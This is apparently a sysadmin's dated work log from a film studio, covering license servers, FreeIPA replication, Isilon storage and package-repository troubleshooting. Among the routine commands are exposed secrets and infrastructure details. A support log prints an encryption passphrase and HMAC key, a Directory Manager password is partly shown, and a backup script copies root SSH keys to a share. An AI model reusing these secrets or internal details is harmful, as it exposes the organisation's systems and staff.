ripslinger :: prodman service for production (pmDpixListener, pmTrigger, pmLoggingServer,   pmDirSync, pmEdiLoadComposition, pmDirSyncServer, pmShotgunChanges?)
 
vmprodmanstage : prodman service for staging

******************************************************************************************************
4Apr18 Houdini licenses

@@@ ./sesi -L gave me a stement "You are not currently entitled to any licenses."
@@@ I went to the houdidni site and downloaded a "Engine" license
@@@ I edited licenses and added it to teh file (in the same format as the "Engine" licese that was in there)

service sesinetd restart 

Looks like it worked (from ./sesictrl -i)
{SNIP}
Lic d00ad7da:    1 "Houdini-Engine 16.5 " Generic    31-jan-2019 +.*.*.*,192.168.*.*,10.*.*.*,172.*.*.* dipper.disneytoonstudios.com
    1 licenses free
{SNIP}


******************************************************************************************************
23Apr18  license backups

dipper
[root@dipper licenses]# crontab -l
#MAILTO="gracet@disneytoonstudios.com"

*/5 * * * * /root/grafana-lics/foundry.sh
*/5 * * * * /root/grafana-lics/houd2.sh
*/5 * * * * /root/grafana-lics/maya.sh
*/1 * * * * /root/grafana-lics/clarisse.sh
*/5 * * * * /root/grafana-lics/rv.sh
59 11 1 * * /root/monthly-license-backup.bash

dippertwo
dsiegfriedt@dippertwo:~ $ sudo crontab -l
59 11 1 * * /root/monthly-license-backup.bash

deadline10
[root@deadline10 ~]# crontab -l
*/5 * * * * /root/grafana/deadline.sh
59 11 1 * * /root/monthly-license-backup.bash

dsiegfriedt@dippertwo:~ $ sudo cat /root/monthly-license-backup.bash
#!/bin/bash

(((
#23Apr18  --siggy  dirty dirty script to backup the license file from dippertitwo

cd /disney/depts/tech/systems/backops/licenses/DIPPER2/

TODAY=`date +%B%Y`

mkdir $TODAY

cd $TODAY

rsync -a /etc/rc5.d/ etc-rc5.d
rsync -a /opt .
rsync -a /etc/rc.d/init.d rc.d-init.d
rsync -a /root/.ssh root-dot-ssh
rsync -a /usr/autodesk/ usr-autodesk
rsync -a /usr/local/ usr-local
rsync -a /usr/pixologic/ usr-pixologic
rsync -a /var/flexlm/ var-flexlm/
rsync -a /usr/local/tweak usr-local-tweak
)))

******************************************************************************************************
24Apr18  DC temp monitor

dsiegfriedt@dts3329:~/JOBS/DISNEYTS/SHUTDOWN $ snmpget -Os -c public -v 1 pwr206-1 1.3.6.1.4.1.1718.3.2.5.1.6.1.1
enterprises.1718.3.2.5.1.6.1.1 = INTEGER: 715

******************************************************************************************************
26Apr18  warhawk fs @ 100%   John running sims on it filled /tmp

ll | grep prod | grep -v houdini_temp | grep -v hsperfdata_jpatton | grep -v isotropix | grep -v tracker-extract-files.1825200161 > 1
cat 1 | awk '{print $9}' > 2
rm -f 1
mv 2 /root
for i in `cat /root/2`; do rm -rf /tmp/$i; done

@@@ picked up 61G in "/"

******************************************************************************************************
27Apr18  esxi reboot

@@@ takes a LONG time to disconnect... be patient

******************************************************************************************************
9May18  google sheets for power
https://docs.google.com/spreadsheets/d/15Ed2JQbOuLvSf8N12WtYmXz-rpNnEg1p1QW8a-bTa9o/edit#gid=0

******************************************************************************************************
15May18  restarting slapd (idm02)

systemctl status dirsrv@DISNEYTOONSTUDIOS-COM.service
systemctl stop dirsrv@DISNEYTOONSTUDIOS-COM.service  
systemctl status dirsrv@DISNEYTOONSTUDIOS-COM.service  
systemctl start dirsrv@DISNEYTOONSTUDIOS-COM.service  

@@@ log in /var/log/dirsrv

CASE 02099495
slapd stopped this morning
@@@ attached sosreport

24May18 response from RH

>> Is this a common occurrence?  Is there a plan of action that I could follow to prevent this from happening?

It is not very common, but can occur if network latency is there & changelog db is rolled over before it is replicated.

You should probably have a mechanism to keep track if replication is happening regularly or not.

Use ipa_check_consistency every day or twice a day to verify the status of replication & use below.

$ for i in $(ipa-replica-manage list | awk '{print $1}'| tr -d ":"); do ipa-replica-manage -v list $i; done

Although it is long output but it is very helpful to find out what is broken & from where to where. 

Hope that helps.

Regards
Arpit Tolani"

******************************************************************************************************
17May18  RH ipa consistancy check script

copied to ~/JOBS/DISNEYTS/IDM

@@@ to run
./ipa_check_consistency "idm01 idm02 idm04" -d disneytoonstudios.com

[root@idm01 IDM]# ./ipa_check_consistency -H "idm01 idm02 idm04" -d disneytoonstudios.com

/disney/home/dsiegfriedt/JOBS/DISNEYTS/IDM/ipa_check_consistency -H "idm01 idm02 idm04" -d disneytoonstudios.com

Directory Manager password: Kl...

***** NOTE  cp to idm01:/root ***** 19Jun18
ssh idm01
sudo su -
@@@ to run
./ipa_check_consistency "idm01 idm02 idm04" -d disneytoonstudios.com


FreeIPA servers:    idm01    idm02    idm04    STATE
====================================================
Active Users        198      198      198      OK   
Stage Users         2        2        2        OK   
Preserved Users     55       55       55       OK   
User Groups         31       31       31       OK   
Hosts               401      401      401      OK   
Host Groups         2        2        2        OK   
HBAC Rules          1        1        1        OK   
SUDO Rules          9        9        9        OK   
DNS Zones           34       34       34       OK   
Certificates        424      431      424      FAIL 
LDAP Conflicts      NO       NO       NO       OK   
Ghost Replicas      NO       NO       NO       OK   
Anonymous BIND      YES      YES      YES      OK   
Microsoft ADTrust   YES      NO       NO       FAIL 
Replication Status  idm02 0  idm01 0  idm02 0       
                    idm04 0  idm04 0  idm01 0       
====================================================

@@@ create a user on idm01 and check it on 02 and 04

[root@idm01 ~]# ipa user-add
First name: T
Last name: ux
User login [tux]: 
----------------
Added user "tux"
----------------
  User login: tux
  First name: T
  Last name: ux
  Full name: T ux
  Display name: T ux
  Initials: Tu
  Home directory: /disney/home/tux
  GECOS: T ux
  Login shell: /bin/bash
  Principal name: tux@DISNEYTOONSTUDIOS.COM
  Principal alias: tux@DISNEYTOONSTUDIOS.COM
  Email address: tux@disneytoonstudios.com
  UID: 1825200416
  GID: 1825200416
  Password: False
  Member of groups: prodctn
  Kerberos keys available: False
[root@idm01 ~]# ipa user-find tux
--------------
1 user matched
--------------
  User login: tux
  First name: T
  Last name: ux
  Home directory: /disney/home/tux
  Login shell: /bin/bash
  Principal name: tux@DISNEYTOONSTUDIOS.COM
  Principal alias: tux@DISNEYTOONSTUDIOS.COM
  Email address: tux@disneytoonstudios.com
  UID: 1825200416
  GID: 1825200416
  Account disabled: False
----------------------------
Number of entries returned 1
----------------------------

@@@ didn't see it on idm02 or idm04 

[root@idm02 ~]# kinit admin
Password for admin@DISNEYTOONSTUDIOS.COM: 


[root@idm02 ~]# ipa user-find tux
--------------
1 user matched
--------------
  User login: tux
  First name: T
  Last name: ux
  Home directory: /disney/home/tux
  Login shell: /bin/bash
  Principal name: tux@DISNEYTOONSTUDIOS.COM
  Principal alias: tux@DISNEYTOONSTUDIOS.COM
  Email address: tux@disneytoonstudios.com
  UID: 1825200416
  GID: 1825200416
  Account disabled: False
----------------------------
Number of entries returned 1
----------------------------

[root@idm01 log]# ipa user-del tux
------------------
Deleted user "tux"
------------------

[root@idm02 ~]# ipa user-find tux
---------------
0 users matched
---------------
----------------------------
Number of entries returned 0
----------------------------

@@@same for idm04

******************************************************************************************************
18May18  set up logrotation

@@@ Before
-rw-------  1 root          root          888M May 18 11:01 dhcpd.log

[root@chug logrotate.d]# pwd
/etc/logrotate.d

[root@chug logrotate.d]# cat dhcpd.conf 
# 18May18  --siggy dhcpd.log getting BIG.  Time to rotate. 
/var/log/dhcpd.log { 
    create 0644 root root
    weekly
    size 50M 
    dateext
    rotate 5
    compress 
        } 

@@@ dryrun  (debug acording to man)
[root@chug logrotate.d]# logrotate -d dhcpd.conf 
reading config file dhcpd.conf
Allocating hash table for state file, size 15360 B

Handling 1 logs

rotating pattern: /var/log/dhcpd.log  52428800 bytes (5 rotations)
empty log files are rotated, old logs are removed
considering log /var/log/dhcpd.log
  log needs rotating
rotating log /var/log/dhcpd.log, log->rotateCount is 5
dateext suffix '-20180518'
glob pattern '-[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]'
glob finding old rotated logs failed
renaming /var/log/dhcpd.log to /var/log/dhcpd.log-20180518
compressing log with: /bin/gzip

@@@ DO IT
[root@chug logrotate.d]# logrotate dhcpd.conf 
gzip: stdin: file size changed while zipping

@@@After
-rw-------  1 root          root           32M May 18 11:07 dhcpd.log-20180518.gz
******************************************************************************************************
21May18   list all cli services you can enable/disable

isi services -la

******************************************************************************************************
23May18  rvio licensing (from email)

DisneyToon Studio
25 RVIO
00:50:56:9c:7b:82
greg.brentin@disneytoonstudios.com
 
******************************************************************************************************
24May18  Theorem-16 service came out and power cycled the node.  These commands are for x410s ONLY

@@@ had to use IP to log in.... log into theorem-1 and run a "isis status".   THat will give you teh IP of the X410s.

theorem-16# history
  277  /usr/bin/isi_hwtools/isi_ipmicmc -d -V -a  cmc
  278  exit
  279  isi_flush
  280  isi status -q
  281  isi_radish -a /dev/ad*|egrep 'SN:|Percent Life'|grep -v Used|sed -e 's/Percent Life Remaining:/PercentLifeRemaining %/' -e 's/Percent Lifetime Left:/PercentLifeRemaining %/' -e 's/is .*//'|awk '{print $1,$2, sprintf("%d","0x"$7 )}'|sed -e 's/% 0/%0/' -e 's/ 0//'
  282  isi upgrade cluster firmware devices
  283  gmirror status
  284  shutdown -h now
  285  isi status -q
  286  isi event bulk --ignore=true --resolved=true
  287  isi_hw_status
  288  gmirror status
  289  camcontrol devlist | grep ad
  290  isi status -q
  291  exit
  292  isi_hw_status



Run the isi_gather_info command.
The gather process begins and progress information appears.
As with the web administration interface, the process takes several minutes.
When the gather process is complete, the files are automatically uploaded to the Isilon FTP site.
For a list of additional options, run the isi_gather_info –h command.

@@@ Looking for the uploaded file :^(
isi_gather_info

{SNIP}
..............................................................................................................................................Information gathering completed... creating compressed package.
.....................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
Packaging complete...
Package: /ifs/data/Isilon_Support/pkg/IsilonLogs-theorem-20180524-112135.tgz
Uploading in progress.  If problems are encountered during the
upload process, the package will need to be sent manually.
Trying Passive FTP...
Uploaded Succeeded (FTP - Passive). File IsilonLogs-theorem-20180524-112135.tgz 
Cleaning up temporary data... done.
Gather-status unlocked

******************************************************************************************************
24May18  the new GIT server

https://gitserver.disneytoonstudios.com/

******************************************************************************************************
31May18  finding S/N for isilon nodes

@@@if you are logged into a node
isi_hw_status | grep -i serno

@@@ all of them are:
theorem-16# isi_for_array -s isi_hw_status | grep -i serno
theorem-1:    SerNo: SX400-201323-0110
theorem-2:    SerNo: SX400-201323-0111
theorem-3:    SerNo: SX400-201323-0104
theorem-4:    SerNo: SX400-201323-0112
theorem-5:    SerNo: SX400-201323-0105
theorem-6:    SerNo: SX400-201328-0036
theorem-7:    SerNo: SN400-201324-0010
theorem-8:    SerNo: SN400-201324-0008
theorem-9:    SerNo: SN400-201324-0006
theorem-10:   SerNo: SN400-201324-0005
theorem-11:   SerNo: SN400-201324-0007
theorem-12:   SerNo: SN400-201324-0009

theorem-13:   SerNo: SX410-311642-0069
theorem-14:   SerNo: SX410-311642-0086
theorem-15:   SerNo: SX410-311642-0061
theorem-16:   SerNo: SX410-301508-0091

13Jun18

corollary-1# isi_for_array -s isi_hw_status | grep -i serno
corollary-1:   SerNo: SS200-301151-0371
corollary-2:   SerNo: SS200-301149-0130
corollary-3:   SerNo: SS200-301151-0370
corollary-4:   SerNo: SS200-301151-0361
corollary-5:   SerNo: SS200-301203-0112
corollary-6:   SerNo: SS200-301219-0068

******************************************************************************************************
7Jun18  isilon clear errors

@@@ from email Michael Winchester Isilon support

SR# 11226927

Node 16 did show the power supply error but with you stating you had power cycled the node the error can be 
expected. Lets clear the error and see if it reoccurs and if it does reoccur we can replace that power supply.

isi event bulk --resolved=true --ignore=true


@@@ shows all OK (as of right now (7Jun18))
ssh root@theorem-1 isi status

******************************************************************************************************
12Jun18 more mari notes

see ~/JOBS/DISNEYTS/MARI/NOTES-MARI

******************************************************************************************************
13Jun18 isilon complaining about node 16 clockkskew

theorem-16# isi_for_array date    
theorem-1:  Wed Jun 13 08:52:10 PDT 2018
theorem-2:  Wed Jun 13 08:52:10 PDT 2018
theorem-4:  Wed Jun 13 08:52:10 PDT 2018
theorem-5:  Wed Jun 13 08:52:10 PDT 2018
theorem-13: Wed Jun 13 08:52:10 PDT 2018
theorem-14: Wed Jun 13 08:52:10 PDT 2018
theorem-15: Wed Jun 13 08:52:10 PDT 2018
theorem-3:  Wed Jun 13 08:52:10 PDT 2018
theorem-6:  Wed Jun 13 08:52:10 PDT 2018
theorem-99: Wed Jun 13 08:52:10 PDT 2018
theorem-16: Wed Jun 13 08:52:10 PDT 2018
theorem-12: Wed Jun 13 08:52:10 PDT 2018
theorem-7:  Wed Jun 13 08:52:10 PDT 2018
theorem-10: Wed Jun 13 08:52:10 PDT 2018
theorem-9:  Wed Jun 13 08:52:10 PDT 2018
theorem-11: Wed Jun 13 08:52:10 PDT 2018
theorem-8:  Wed Jun 13 08:52:10 PDT 2018

dsiegfriedt@dts3329:~/JOBS/DISNEYTS/VEEAM $ cat ~/Downloads/smbcron.9588 
MAILTO="grace.thompson@disneytoonstudios.com"
0 5 * * * /bin/bash /ifs/data/scripts/reports.sh > /ifs/data/disney/depts/tech/systems/isilon/reports/usage.txt

theorem-16# cat /ifs/data/scripts/reports.sh 
#!/bin/bash

/usr/bin/isi quota list   
/bin/df -a -h /ifs
echo ""
/usr/bin/isi storagepool list 

@@@ from the error email I looked at the logs and the failure was trying to contact EMC @ the address below.


[2018-06-13 00:05:29] MFT session details...
[2018-06-13 00:05:29] File[0]=/opt/connectemcVE/poll/incoming/RSC_SX400-201323-0105_061318_000155682_IsilonAlertAttachments.zip.gzip. Size=2088
[2018-06-13 00:05:29] File[1]=/opt/connectemcVE/poll/incoming/RSC_SX400-201323-0105_061318_000155682_IsilonAlertAttachments.zip.end. Size=101
[2018-06-13 00:05:29] Executing openssl aes-256-cbc -d -a -in /opt/scripts/esrsvescript-linux/bin/esrsve-primary-api.key -out /opt/connectemcVE/vekey -pass pass:ELMESR10167WFP 2>&1

[2018-06-13 00:05:29] Successfully decrypted key

[2018-06-13 00:05:29] MFT transfer timeout=900
[2018-06-13 00:05:29] http://esrswebqa0.corp.emc.com/r/mft/incoming/esrs/v1/devices/ESRS-VE/ELMESR10167WFP/mft
[2018-06-13 00:05:29] http://esrswebqa0.corp.emc.com/r/mft/incoming/esrs/v1/devices/ESRS-VE/ELMESR10167WFP/mft/RSC_SX400-201323-0105_061318_000155682_IsilonAlertAttachments.zip.gzip
[2018-06-13 00:05:29] keylength is 128
[2018-06-13 00:05:29] af83f4942aee050a45e30b9ab816a8d91b190a924499bbb40fb23f0f07479eaa63f34e5727f5d20f6f8f6100ed33b1b444821a4c894208da8d5d49b9f05c7090
[2018-06-13 00:05:29] Executing openssl dgst -sha1 -hmac af83f4942aee050a45e30b9ab816a8d91b190a924499bbb40fb23f0f07479eaa63f34e5727f5d20f6f8f6100ed33b1b444821a4c894208da8d5d49b9f05c7090 -binary /tmp/todigest.txt | openssl enc -base64 -out /tmp/signature_1.txt 2>&1

[2018-06-13 00:05:29] Signature generated successfully
[2018-06-13 00:05:29] Auth string = ESRS-VE:ELMESR10167WFP:yLHsUDfPtTIaO+MI6NBL8wHV/gg=,domain=Device
[2018-06-13 00:05:29] Starting the CURL transfer ...
[2018-06-13 00:05:29] CURL Transfer complete
[2018-06-13 00:05:29] mft failed Could not resolve host: esrswebqa0.corp.emc.com, error:6, cmd:http://esrswebqa0.corp.emc.com/r/mft/incoming/esrs/v1/devices/ESRS-VE/ELMESR10167WFP/mft 
Could not resolve host: esrswebqa0.corp.emc.com
Closing connection 0
[2018-06-13 00:05:29] MFT Transfer ended.


@@@ I do not think this is an error @ DTS

theorem-16# curl esrswebqa0.corp.emc.com 
curl: (6) Couldn't resolve host 'esrswebqa0.corp.emc.com'
theorem-16# 

@@@ ALSO the 
The path of the zip to be transfered does not exist
/opt/connectemcVE/poll/incoming/RSC_SX400-201323-0105_061318_000155682_IsilonAlertAttachments.zip.gzip.

theorem-1# ls -le /opt           
total 0
lrwxr-xr-x    1 root  wheel  27 Feb  4  2017 connectemc -> ../..//usr/local/connectemc

theorem-1# ls -le /opt/connectemc/
total 15160
-rwx------    1 root  wheel         4 Apr  8  2017 .ceclock
-rw-r--r--    1 root  wheel      3446 Feb  4  2017 ConnectEMC.ini
-rw-r--r--    1 root  wheel       656 May 22  2017 ConnectEMC_config.xml
drwxr-xr-x    3 root  wheel       512 May 24 09:02 ESRSGWExt
-rwxr-xr-x    1 root  wheel       196 Feb  4  2017 cemcresume.sh
-rwxr-xr-x    1 root  wheel       201 Feb  4  2017 cemcsuspend.sh
drwx------    2 root  wheel       512 Feb  4  2017 certs
-rwxr-xr-x    1 root  wheel  15474532 Feb  4  2017 connectemc
drwx------    2 root  wheel       512 Feb  4  2017 keys
drwxr-xr-x    2 root  wheel       512 Apr  8  2017 logs
-rw-r--r--    1 root  wheel       183 Jun 13 09:38 recycle.txt
drwxr-xr-x    2 root  wheel       512 Feb  4  2017 remotesupport


******************************************************************************************************
13Jun18   misc isilon stuff

ls -al /ifs/data/disney/home
drwxr-x---     68 1825200333  1100           3519 Jun 13 12:07 dsiegfriedt

dsiegfriedt@dts3329:~/JOBS/DISNEYTS $ id dsiegfriedt
uid=1825200333(dsiegfriedt) gid=1100(prodctn) groups=1100(prodctn),1825200005(systems),1825200176(engineers),2100(vpnusers),1825200000(admins)


theorem-1# id dsiegfriedt
uid=1000073(dsiegfriedt) 
gid=1000004(domain users) 
groups=1000004(domain users),
		      1000015(finance group),
		      1000016(hr group),
		      1000008(enterprise admins),
		      1000028(sophosuser),
		      1000027(ee group),
		      1000006(denied rodc password replication group),
		      1000029(sophosadministrator),
		      1000037(allstaff),
		      1000035(overhead),
		      10(admin),
		      1000011(tech group),
		      1000036(patio),
		      1000010(tech admins group),
		      1000005(domain admins),
		      1544(Administrators),
		      1545(Users)


******************************************************************************************************
14Jun18  isilon Job SnapshotDelete has failed email

https://www.emc.com/collateral/TechnicalDocument/docu70014.pdf

isi snapshot snapshot list
isi snapshot snapshot list --format=table --sort=path | grep -v SIQ

@@@ wait a little bit to see if the next round fixes the deletion problem
******************************************************************************************************
15Jun18  d20735 build error

puppet agent --test FAILED

yum erase pugixml openimageio

now fails on gulliver

curl http://chug.disneytoonstudios.com/pulp/repos/dts/Library/custom/7w_dts/sw/

@@@ gave me  gulliver-1.0.5.19.g341b943-1.dts.el7.noarch.rpm
@@@ yum install is looking for gulliver.noarch 1:1.0.5.52.gb4b0c72-1.dts.el7

Is this ok [y/d/N]: y
Downloading packages:
No Presto metadata available for sw
gulliver-1.0.5.52.gb4b0c72-1.d FAILED                                          
http://chug.disneytoonstudios.com/pulp/repos/dts/Library/custom/7w_dts/sw/gulliver-1.0.5.52.gb4b0c72-1.dts.el7.noarch.rpm: [Errno 14] HTTP Error 416 - Requested Range Not Satisfiable
Trying other mirror.


Error downloading packages:
  1:gulliver-1.0.5.52.gb4b0c72-1.dts.el7.noarch: [Errno 256] No more mirrors to try.

[root@chug ~]# find / -xdev -name pulp

/var/lib/pulp/nodes/published/https/repos

base_url": "https://chug.disneytoonstudios.com/pulp/nodes/https/repos/dts-7s_dts-sw

./content/units/rpm/17/83bdd2fc77adeb4835fd28c69d84cdbd141ebfe9054651f530161d2d4522fd/gulliver-1.0.5.52.gb4b0c72-1.dts.el7.noarch.rpm

*****

/var/lib/pulp/content/units/rpm/17/83bdd2fc77adeb4835fd28c69d84cdbd141ebfe9054651f530161d2d4522fd/gulliver-1.0.5.52.gb4b0c72-1.dts.el7.noarch.rpm

*****
@@@ cp to ~dsiegfriedt

@@@ installed by hand
@@@ yum install /tmp/gulliver


@@@ with Amy
yum erase gulliver (and it's dependecies)

@@@ history after the fact

   75  yum erase gulliver
   77  repoquery -i gulliver
   78  yum erase gulliver
   79  rpm -qa | grep gulliver (GONE)
   80  yum install gulliver
   81  yum --enablerepo=sw clean metadata
   82  yum install gulliver
   83  rm -fr /var/cache/yum/*  (this is to address the "No Presto metadata available for sw")
   84  yum clean all

[root@d20735 ~]# yum install gulliver

{SNIP}

Install  1 Package (+5 Dependent packages)

Total size: 15 M
Total download size: 72 k
Installed size: 29 M
Is this ok [y/d/N]: y
Downloading packages:
No Presto metadata available for sw
gulliver-1.0.5.52.gb4b0c72-1.d FAILED                                          
                             ^  
http://chug.disneytoonstudios.com/pulp/repos/dts/Library/custom/7w_dts/sw/gulliver-1.0.5.52.gb4b0c72-1.dts.el7.noarch.rpm: [Errno 14] HTTP Error 416 - Requested Range Not Satisfiable
Trying other mirror.

Error downloading packages:
  1:gulliver-1.0.5.52.gb4b0c72-1.dts.el7.noarch: [Errno 256] No more mirrors to try.

@@@ what do I always say sometimes?  "A fool can ask more questions than a wize man can answer......"
@@@ Amy has no idea why


@@@ continue to get puppet errors pointing to satellite

https://satellite.disneytoonstudios.com/products/60/repositories/287

7w_dts
http://chug.disneytoonstudios.com/pulp/repos/dts/Library/custom/7w_dts/sw
@@@ looks like it may be the same place
file:///disney/dist/linux/repo/el72/sw

Sync Status

Sync Interval Hourly at 2015-07-22 19:01:00 UTC minutes and 2015-07-22 19:01:00 UTC seconds
Last Sync 21 minutes Ago (2018-06-15 23:01:08 UTC Local Time)
Next Sync Synced manually, no interval set.
Sync State success


******************************************************************************************************
19Jun18  xeyes

xeyes 1920x300    @@@ nuff said

******************************************************************************************************
20Jun18  back to gulliver..... d20735

[root@chug pub]# pwd
/var/www/pub

[root@chug pub]# find . -name "*gulliver*"
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.26.gf87836c-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.30.g22a30dd-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.37.g5bb92bc-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.46.ge631e3e-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.45.g49ac0ef-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.27.g2149cee-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.40.g1518589-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.49.g20e45f2-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.42.gb2c2eaf-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.52.gb4b0c72-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.36.g1f43477-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.29.gc2449a2-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.19.g341b943-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.47.gf15c973-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.39.g8c75c70-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.32.gb7869f0-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.28.g6a0ada9-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.33.ga3603aa-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.44.g67028fe-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.43.gbfd7f7b-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.41.gd7b7721-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-7w_dts-sw/1528927453.9/gulliver-1.0.5.38.g08d927e-1.dts.el7.noarch.rpm
./yum/master/yum_distributor/dts-6w_dts-sw/1446670872.15/gulliver-0.0.1.28.g0ed03b0-1.wdas.el6.noarch.rpm
./yum/master/yum_distributor/dts-6w_dts-sw/1446670872.15/gulliver-0.0.1.33.g71dbca7-1.wdas.el6.noarch.rpm
./yum/master/yum_distributor/dts-6w_dts-sw/1446670872.15/gulliver-0.0.1.38.g4a6f58f-1.wdas.el6.noarch.rpm
[root@chug pub]#

curl http://chug.disneytoonstudios.com/pulp/repos/dts/Library/custom/7w_dts/sw/ | grep gulliver
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:--  0:00:09 --:--:--     0            <li><a href="gulliver-1.0.5.19.g341b943-1.dts.el7.noarch.rpm">gulliver-1.0.5.19.g341b943-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.26.gf87836c-1.dts.el7.noarch.rpm">gulliver-1.0.5.26.gf87836c-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.27.g2149cee-1.dts.el7.noarch.rpm">gulliver-1.0.5.27.g2149cee-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.28.g6a0ada9-1.dts.el7.noarch.rpm">gulliver-1.0.5.28.g6a0ada9-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.29.gc2449a2-1.dts.el7.noarch.rpm">gulliver-1.0.5.29.gc2449a2-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.30.g22a30dd-1.dts.el7.noarch.rpm">gulliver-1.0.5.30.g22a30dd-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.32.gb7869f0-1.dts.el7.noarch.rpm">gulliver-1.0.5.32.gb7869f0-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.33.ga3603aa-1.dts.el7.noarch.rpm">gulliver-1.0.5.33.ga3603aa-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.36.g1f43477-1.dts.el7.noarch.rpm">gulliver-1.0.5.36.g1f43477-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.37.g5bb92bc-1.dts.el7.noarch.rpm">gulliver-1.0.5.37.g5bb92bc-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.38.g08d927e-1.dts.el7.noarch.rpm">gulliver-1.0.5.38.g08d927e-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.39.g8c75c70-1.dts.el7.noarch.rpm">gulliver-1.0.5.39.g8c75c70-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.40.g1518589-1.dts.el7.noarch.rpm">gulliver-1.0.5.40.g1518589-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.41.gd7b7721-1.dts.el7.noarch.rpm">gulliver-1.0.5.41.gd7b7721-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.42.gb2c2eaf-1.dts.el7.noarch.rpm">gulliver-1.0.5.42.gb2c2eaf-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.43.gbfd7f7b-1.dts.el7.noarch.rpm">gulliver-1.0.5.43.gbfd7f7b-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.44.g67028fe-1.dts.el7.noarch.rpm">gulliver-1.0.5.44.g67028fe-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.45.g49ac0ef-1.dts.el7.noarch.rpm">gulliver-1.0.5.45.g49ac0ef-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.46.ge631e3e-1.dts.el7.noarch.rpm">gulliver-1.0.5.46.ge631e3e-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.47.gf15c973-1.dts.el7.noarch.rpm">gulliver-1.0.5.47.gf15c973-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.49.g20e45f2-1.dts.el7.noarch.rpm">gulliver-1.0.5.49.g20e45f2-1.dts.el7.noarch.rpm</a></li>
            <li><a href="gulliver-1.0.5.52.gb4b0c72-1.dts.el7.noarch.rpm">gulliver-1.0.5.52.gb4b0c72-1.dts.el7.noarch.rpm</a></li>
100  158k  100  158k    0     0  17461      0  0:00:09  0:00:09 --:--:-- 37947
dsiegfriedt@dts3329:~ $ 

26Jun18 RH case #02128201

@@@ I assumed to run these on chug

subscription-manager identity

ls /var/lib/pulp/published/yum/https/repos/dts/Library/custom/7w_dts/sw/ | grep -i gulliver

ll /var/lib/pulp/published/yum/https/repos/dts/Library/custom/7w_dts
   total 33
   lrwxrwxrwx 1 apache apache 83 May 15  2017 add-ons -> /var/lib/pulp/published/yum/master/yum_distributor/dts-7w_dts-add-ons/1494914400.58
   lrwxrwxrwx 1 apache apache 80 May 15  2017 coda -> /var/lib/pulp/published/yum/master/yum_distributor/dts-7w_dts-coda/1494914400.47
   lrwxrwxrwx 1 apache apache 82 May 15  2017 custom -> /var/lib/pulp/published/yum/master/yum_distributor/dts-7w_dts-custom/1494914405.94
   -rw-r--r-- 1 apache apache 30 Jun 25 16:35 listing
